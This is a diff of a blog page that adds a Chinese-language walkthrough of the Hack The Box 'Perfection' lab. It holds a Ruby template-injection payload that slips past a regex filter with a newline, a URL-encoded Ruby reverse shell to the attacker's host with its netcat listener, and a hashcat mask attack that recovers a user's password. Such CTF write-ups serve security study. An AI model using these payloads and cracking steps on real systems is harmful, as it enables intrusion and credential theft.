@@ -16,15 +16,27 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="## 信息蒐集Nmap 1234567891011121314151617181920212223─(x㉿kali)-[~]└─$ export ip&#x3D;10.10.11.253                                                                                   ┌──(x㉿kali)-[~]└─$ mkdir perf">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hackthebox-Perfection Writeup">
 <meta property="og:url" content="http://example.com/2024/07/12/Hackthebox-Perfection-Writeup/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="## 信息蒐集Nmap 1234567891011121314151617181920212223─(x㉿kali)-[~]└─$ export ip&#x3D;10.10.11.253                                                                                   ┌──(x㉿kali)-[~]└─$ mkdir perf">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Perfection.png">
+<meta property="og:image" content="http://example.com/image.png">
+<meta property="og:image" content="http://example.com/image-1.png">
+<meta property="og:image" content="http://example.com/image-2.png">
+<meta property="og:image" content="http://example.com/image-3.png">
+<meta property="og:image" content="http://example.com/image-5.png">
+<meta property="og:image" content="http://example.com/image-4.png">
+<meta property="og:image" content="http://example.com/image-8.png">
+<meta property="og:image" content="http://example.com/image-9.png">
 <meta property="article:published_time" content="2024-07-11T20:12:56.000Z">
-<meta property="article:modified_time" content="2024-07-11T20:12:56.815Z">
+<meta property="article:modified_time" content="2024-07-12T00:29:54.441Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/Perfection.png">
   
   
   
@@ -217,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          800 words
         
       </span>
     
@@ -228,7 +240,7 @@
         
         
         
-          1 mins
+          7 mins
         
       </span>
     
@@ -270,13 +282,96 @@
             
               <div class="markdown-body">
                 
-                
+                <h2 id="信息蒐集"><a href="#信息蒐集" class="headerlink" title="## 信息蒐集"></a><img src="/Perfection.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>## 信息蒐集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">─(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">export</span> ip=10.10.11.253<br>                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> perfection;<span class="hljs-built_in">cd</span> perfection<br>                                                                                   <br>┌──(x㉿kali)-[~/perfection]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -sV -sC <span class="hljs-variable">$ip</span><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 04:43 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.253<br>Host is up (0.18s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 80:e4:79:e8:59:28:<span class="hljs-built_in">df</span>:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)<br>|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Weighted Grade Calculator<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.95 seconds<br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="發現兩個端口開放-22-tcp-open-ssh-OpenSSH-8-9p1-80-tcp-open-http-nginx-HTTP"><a href="#發現兩個端口開放-22-tcp-open-ssh-OpenSSH-8-9p1-80-tcp-open-http-nginx-HTTP" class="headerlink" title="發現兩個端口開放- 22&#x2F;tcp open  ssh     OpenSSH 8.9p1- 80&#x2F;tcp open  http    nginx### HTTP"></a>發現兩個端口開放<br>- 22&#x2F;tcp open  ssh     OpenSSH 8.9p1<br>- 80&#x2F;tcp open  http    nginx<br>### HTTP</h2><p>進入網頁後發現這是一個計算加權成績的計算機</p>
+<p><img src="/image.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>再進入<code>About Us</code>團隊有兩位成員<strong>smith</strong>跟<strong>miller</strong>,頁腳顯示使用<strong>Webrick 1.7.0</strong></p>
+<p><img src="/image-1.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>google後發現沒有漏洞可以利用,看起來是沒有</p>
+<p>用wappalyzer插件看到網站使用了<strong>Ruby</strong></p>
+<p><img src="/image-2.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>進入&#x2F;weighted-grade有輸入點</p>
+<p><img src="/image-3.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>感覺有機會SSTI模板注入,用<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">Hackthetricks</a>的payload<code>&lt;%= `id` %&gt;</code>試試看</p>
+<p>用burpsuite然後把payload用urlencode</p>
+<p><img src="/image-5.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>被偵測為惡意行為</p>
+<p><img src="/image-4.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h3 id="ruby-Regex"><a href="#ruby-Regex" class="headerlink" title="ruby Regex"></a>ruby Regex</h3><p>看起來後端有驗證,但發現這篇<a target="_blank" rel="noopener" href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/">文章</a>說ruby的Regex可以用\n來繞過</p>
+<p>像這樣</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">my_input = <span class="hljs-string">&quot;abc&lt;%= 7*7 %&gt;\n&quot;</span><br><br><span class="hljs-keyword">if</span> my_input.match(<span class="hljs-regexp">/^[0-9a-z]+$/</span>)<br>  puts <span class="hljs-string">&quot;Matches pattern, let&#x27;s continue...&quot;</span><br><span class="hljs-keyword">else</span><br>  puts <span class="hljs-string">&quot;Does not match. Error out...&quot;</span><br><span class="hljs-keyword">end</span> <br></code></pre></td></tr></table></figure>
+
+<p>於是將原本的payload改成</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>&lt;%= `id` %&gt;<br></code></pre></td></tr></table></figure>
+<p>urlencode後</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">test</span>％<span class="hljs-number">0</span>A&lt;%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>D`id`+%<span class="hljs-number">25</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[[Note:]]換行\n的urlencode是%0A,需要手動加上去 </p>
+</blockquote>
+<p>成功執行</p>
+<p><img src="/image-8.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>去<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a> 生成一個 urlencode的ruby reverse shell payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">test</span>%<span class="hljs-number">0</span>A&lt;%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>d+`ruby%<span class="hljs-number">20</span>-rsocket%<span class="hljs-number">20</span>-e%<span class="hljs-number">27</span>spawn%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>sh%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">5</span>B%<span class="hljs-number">3</span>Ain%<span class="hljs-number">2</span>C%<span class="hljs-number">3</span>Aout%<span class="hljs-number">2</span>C%<span class="hljs-number">3</span>Aerr%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>ETCPSocket.new%<span class="hljs-number">28</span>%<span class="hljs-number">2210</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">53</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C9000%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">27</span>`+%<span class="hljs-number">25</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(x㉿kali)-<span class="hljs-selector-attr">[~]</span><br>└─$ nc -lvnp <span class="hljs-number">9000</span>                       <br>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">9000</span> ...<br>connect to <span class="hljs-selector-attr">[10.10.14.53]</span> from (UNKNOWN) <span class="hljs-selector-attr">[10.10.11.253]</span> <span class="hljs-number">49506</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><hr>
+<h3 id="使用-Python-升级到完全交互式-shell"><a href="#使用-Python-升级到完全交互式-shell" class="headerlink" title="使用 Python 升级到完全交互式 shell"></a>使用 Python 升级到完全交互式 shell</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;;<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">SHELL</span>=bash<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm-256color<br></code></pre></td></tr></table></figure>
+<h2 id="ctrl-z-將shell送到後台"><a href="#ctrl-z-將shell送到後台" class="headerlink" title="ctrl-z 將shell送到後台"></a><code>ctrl-z</code> 將shell送到後台<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">susan@perfection:~/ruby_app$ id<br><span class="hljs-attribute">uid</span>=1001(susan) <span class="hljs-attribute">gid</span>=1001(susan) <span class="hljs-attribute">groups</span>=1001(susan),27(sudo)<br></code></pre></td></tr></table></figure>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">susan@perfection:~$ ls -la /var/mail<br>total 12<br>drwxrwsr-x<span class="hljs-number"> 2 </span>root mail<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 14 </span>2023 .<br>drwxr-xr-x<span class="hljs-number"> 13 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 27 </span>2023 ..<br>-rw-r-----<span class="hljs-number"> 1 </span>root susan<span class="hljs-number"> 625 </span>May<span class="hljs-number"> 14 </span>2023 susan<br></code></pre></td></tr></table></figure>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">susan@perfection:~$ cat /<span class="hljs-keyword">var</span>/mail/susan<br><br>Due <span class="hljs-keyword">to</span> our transition <span class="hljs-keyword">to</span> Jupiter Grades because <span class="hljs-keyword">of</span> the PupilPath data breach, I<br>thought we should also migrate our credentials (<span class="hljs-string">&#x27;our&#x27;</span> including the other<br>students<br><span class="hljs-keyword">in</span> our <span class="hljs-keyword">class</span>) <span class="hljs-keyword">to</span> the <span class="hljs-keyword">new</span> <span class="hljs-keyword">platform</span>. I also suggest a <span class="hljs-keyword">new</span> password specification,<br><span class="hljs-keyword">to</span> make things easier <span class="hljs-keyword">for</span> everyone. The password format <span class="hljs-keyword">is</span>:<br><span class="hljs-comment">&#123;firstname&#125;</span>_<span class="hljs-comment">&#123;firstname backwards&#125;</span>_<span class="hljs-comment">&#123;randomly generated integer between 1 and</span><br><span class="hljs-comment">1,000,000,000&#125;</span><br>Note that all letters <span class="hljs-keyword">of</span> the first name should be convered <span class="hljs-keyword">into</span> lowercase.<br>Please hit me <span class="hljs-keyword">with</span> updates <span class="hljs-keyword">on</span> the migration when you can. I am currently<br>registering our university <span class="hljs-keyword">with</span> the <span class="hljs-keyword">platform</span>.<br>- Tina, your delightful student<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">susan@perfection:~$ ls -la Migration/<br>total 16<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 27 </span>2023 .<br>drwxr-x---<span class="hljs-number"> 7 </span>susan susan<span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 26 </span>09:41 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 8192 </span>May<span class="hljs-number"> 14 </span>2023 pupilpath_credentials.db<br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cat pupilpath_credentials.db<br>��^�ableusersusersCREATE <span class="hljs-keyword">TABLE</span> users (<br>id <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">TEXT</span>,<br><span class="hljs-keyword">password</span> <span class="hljs-type">TEXT</span><br>a�\<br>Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f<br></code></pre></td></tr></table></figure>
+<p>取得hash<code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</code></p>
+<p>辨識hash類型</p>
+<p><img src="/image-9.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>利用hashcat破解密碼</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(x㉿kali)-[~]<br>└─<span class="hljs-symbol">$</span> hashcat -h | grep -i sha2<span class="hljs-number">-256</span>    #查看sha2<span class="hljs-number">-256</span>的mode<br>   <span class="hljs-number">1400</span> | SHA2<span class="hljs-number">-256</span> <br><br>┌──(x㉿kali)-[~]<br>└─<span class="hljs-symbol">$</span> echo <span class="hljs-string">&quot;susan_nasus_&quot;</span> &gt; word     #前綴<br>                                                     <br>┌──(x㉿kali)-[~]<br>└─<span class="hljs-symbol">$</span> echo <span class="hljs-string">&quot;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&quot;</span> &gt;hash.txt<br><br>┌──(x㉿kali)-[~]<br>└─<span class="hljs-symbol">$</span> hashcat -m <span class="hljs-number">1400</span> -a <span class="hljs-number">6</span> hash.txt word ?d?d?d?d?d?d?d?d?d -O<br><br>hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>) starting<br><br>OpenCL API (OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">17.0</span><span class="hljs-number">.6</span>, SLEEF, DISTRO, POCL_DEBUG) - Platform #<span class="hljs-number">1</span> [The pocl project]<br>==================================================================================================================================================<br><span class="hljs-comment">* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11320H @ 3.20GHz, 6832/13729 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">31</span><br><br>Hashes: <span class="hljs-number">1</span> digests; <span class="hljs-number">1</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br><br>Optimizers applied:<br><span class="hljs-comment">* Optimized-Kernel</span><br><span class="hljs-comment">* Zero-Byte</span><br><span class="hljs-comment">* Precompute-Init</span><br><span class="hljs-comment">* Early-Skip</span><br><span class="hljs-comment">* Not-Salted</span><br><span class="hljs-comment">* Not-Iterated</span><br><span class="hljs-comment">* Single-Hash</span><br><span class="hljs-comment">* Single-Salt</span><br><span class="hljs-comment">* Raw-Hash</span><br><br>Watchdog: Temperature <span class="hljs-keyword">abort</span> trigger <span class="hljs-keyword">set</span> to <span class="hljs-comment">90c</span><br><br>Host <span class="hljs-comment">memory required for this attack: 2 MB</span><br><br>Dictionary <span class="hljs-comment">cache built:</span><br><span class="hljs-comment">* Filename..: word</span><br><span class="hljs-comment">* Passwords.: 1</span><br><span class="hljs-comment">* Bytes.....: 13</span><br><span class="hljs-comment">* Keyspace..: 1000000000</span><br><span class="hljs-comment">* Runtime...: 0 secs</span><br><br>The <span class="hljs-comment">wordlist or mask that you are using is too small.</span><br>This <span class="hljs-comment">means that hashcat cannot use the full parallel power of your device(s).</span><br>Unless <span class="hljs-comment">you supply more work, your cracking speed will drop.</span><br>For <span class="hljs-comment">tips on supplying more work, see: https:</span>//<span class="hljs-comment">hashcat.net</span>/faq/<span class="hljs-comment">morework</span><br><br>Approaching <span class="hljs-comment">final keyspace - workload adjusted.</span>           <br><br>Cracking <span class="hljs-comment">performance lower than expected?</span>                 <br><br><span class="hljs-comment">* Append -w 3 to the commandline.</span><br>  This <span class="hljs-comment">can cause your screen to lag.</span><br><br><span class="hljs-comment">* Update your backend API runtime / driver the right way:</span><br>  https:<span class="hljs-comment">//hashcat.net/faq/wrongdriver</span><br><br><span class="hljs-comment">* Create more work items to make use of your parallelization power:</span><br>  https:<span class="hljs-comment">//hashcat.net/faq/morework</span><br><br>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1400 (SHA2-256)<br>Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f<br>Time.Started.....: Fri <span class="hljs-comment">Jul 12 08:11:50 2024 (59 secs)</span><br>Time.Estimated...: Fri <span class="hljs-comment">Jul 12 08:12:49 2024 (0 secs)</span><br>Kernel.Feature...: Optimized <span class="hljs-comment">Kernel</span><br>Guess.Base.......: File <span class="hljs-comment">(word), Left Side</span><br>Guess.Mod........: Mask <span class="hljs-comment">(?d?d?d?d?d?d?d?d?d) [9], Right Side</span><br>Guess.Queue.Base.: 1/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)<br>Guess.Queue.<span class="hljs-built_in">Mod</span>..: <span class="hljs-number">1</span>/1 (100.00%)<br>Speed.#1.........:  2036.5 kH/s (<span class="hljs-number">0.05</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">512</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">16</span><br>Recovered........: <span class="hljs-number">1</span>/1 (100.00%) Digests <span class="hljs-comment">(total), 1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)<br>Progress.........: <span class="hljs-number">125967360</span>/<span class="hljs-comment">1000000000 (12.60%)</span><br>Rejected.........: 0/<span class="hljs-number">125967360</span> (<span class="hljs-number">0.00</span>%)<br>Restore.Point....: <span class="hljs-number">0</span>/1 (0.00%)<br>Restore.Sub.#1...: Salt:0 Amplifier:125966848-125967360 Iteration:0-512<br>Candidate.Engine.: Device <span class="hljs-comment">Generator</span><br>Candidates.#1....: susan_nasus_758539210 <span class="hljs-comment">-&gt; susan_nasus_643759210</span><br>Hardware.Mon.#1..: Temp: 52c <span class="hljs-comment">Util: 26%</span><br></code></pre></td></tr></table></figure>
+
+<p>取得密碼<code>susan_nasus_413759210</code></p>
+<hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> /root/root.txt<br>    &lt;flag&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hackthebox-Writeups/" class="category-chain-item">Hackthebox Writeups</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
